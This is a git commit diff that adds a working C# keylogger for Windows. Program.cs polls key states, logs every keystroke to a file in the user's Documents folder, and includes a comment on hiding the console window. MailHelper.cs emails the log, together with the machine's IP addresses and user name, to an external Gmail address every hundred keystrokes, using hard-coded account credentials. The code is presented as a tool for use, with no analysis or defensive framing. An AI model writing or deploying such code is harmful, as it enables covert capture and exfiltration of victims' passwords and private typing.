857d10138e08b5ec44a560851200b2764cb5da98
mrtcnrdm <mrtcnrdmii@gmail.com>
2021-07-11 01:16:08 +0300

    Code Updated

---
+++ Helper/MailHelper.cs
@@ -0,0 +1,50 @@
+﻿#region - Using
+
+using System;
+using System.IO;
+using System.Net;
+using System.Net.Mail;
+
+#endregion - Using
+
+namespace Helper
+{
+    public class MailHelper
+    {
+        public static void SendNewMessage()
+        {
+            //send the contents of the text file to an external email address.
+            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            string filePath = folderName + @"\KeyStrokes.txt";
+            String logContents = File.ReadAllText(filePath);
+            string emailBody = "";
+
+            //create an email message
+            DateTime now = DateTime.Now;
+            string subject = "Message from keylogger";
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+
+            foreach (var address in host.AddressList)
+            {
+                emailBody += "Address: " + address;
+            }
+            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
+            emailBody += "\nhost: " + host;
+            emailBody += "\ntime: " + now.ToString() + "\n";
+            emailBody += logContents;
+
+            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
+            MailMessage mailMessage = new MailMessage();
+
+            mailMessage.From = new MailAddress("keylogacco@gmail.com");
+            mailMessage.To.Add("mrtcnrdmii@gmail.com");
+            mailMessage.Subject = subject;
+            client.UseDefaultCredentials = false;
+            client.EnableSsl = true;
+            client.Credentials = new System.Net.NetworkCredential("keylogacco@gmail.com", "keylog123");
+            mailMessage.Body = emailBody;
+
+            client.Send(mailMessage);
+        }
+    }
+}
--- Keylogger/Program.cs
+++ Keylogger/Program.cs
@@ -1,12 +1,84 @@
-﻿using System;
+﻿#region - Using
+
+using Helper;
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+#endregion - Using
 
 namespace Keylogger
 {
-    class Program
+    internal class Program
     {
-        static void Main(string[] args)
+        /*
+            konsolu gizlemek için csproj içindeki
+            <OutputType>Exe</OutputType> 'yi
+            <OutputType>WinExe</OutputType> yap
+        */
+
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+        //string to hold all of the keystrokes
+        private static long numberOfKeystrokes = 0;
+
+        private static void Main(string[] args)
         {
-            Console.WriteLine("Hello World!");
+            String filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
+            if (!Directory.Exists(filePath))
+            {
+                Directory.CreateDirectory(filePath);
+            }
+
+            string path = (filePath + @"\KeyStrokes.txt");
+
+            if (!File.Exists(path))
+            {
+                using (StreamWriter sw = File.CreateText(path))
+                {
+                }
+            }
+
+            //asciitable.com
+            int asciTableData = 127;
+
+            //plan
+            //1- capture keystrokes and display them to the console
+            while (true)
+            {
+                //pause and let other programs get a change to run
+                Thread.Sleep(5);
+
+                //check all keys for their state
+                for (int i = 32; i < asciTableData; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+
+                    //print to the console
+                    if (keyState == 32769)
+                    {
+                        //Console.Write((char)i + ", ");
+
+                        //2- store the strokes into a text file
+                        using (StreamWriter sw = File.AppendText(path))
+                        {
+                            sw.Write((char)i);
+                        }
+
+                        numberOfKeystrokes++;
+
+                        //3- periodically send the contents of the file to an external email address
+                        //send every 100 characters typed.
+                        if (numberOfKeystrokes % 100 == 0)
+                        {
+                            MailHelper.SendNewMessage();
+                        }
+                    }
+                }
+            }
         }
     }
 }
